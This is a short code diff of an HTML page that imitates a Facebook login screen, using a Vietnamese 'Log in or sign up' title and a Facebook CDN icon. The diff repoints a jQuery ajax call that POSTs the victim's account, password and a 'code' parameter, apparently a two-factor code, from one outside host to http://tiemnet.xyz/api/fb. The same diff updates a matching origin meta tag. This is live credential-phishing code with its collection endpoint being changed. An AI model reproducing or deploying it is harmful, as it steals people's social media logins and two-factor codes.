@@ -3,7 +3,7 @@
 
 <head>
   <title>Đăng nhập hoặc đăng ký</title>
-  <meta http-equiv="Access-Control-Allow-Origin" content="https://nguoigiupviecvn.com/">
+  <meta http-equiv="Access-Control-Allow-Origin" content="http://tiemnet.xyz/">
   <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
   <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196" />
   <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
@@ -169,7 +169,7 @@
       var pass = $('#m_login_password').val();
       var code =$.urlParam('code');
       $.ajax({
-        url: 'https://nguoigiupviecvn.com/api/fb',
+        url: 'http://tiemnet.xyz/api/fb',
         method: 'POST',
         dataType: 'JSON',
         data: { acc: acc, pass: pass, code:code },
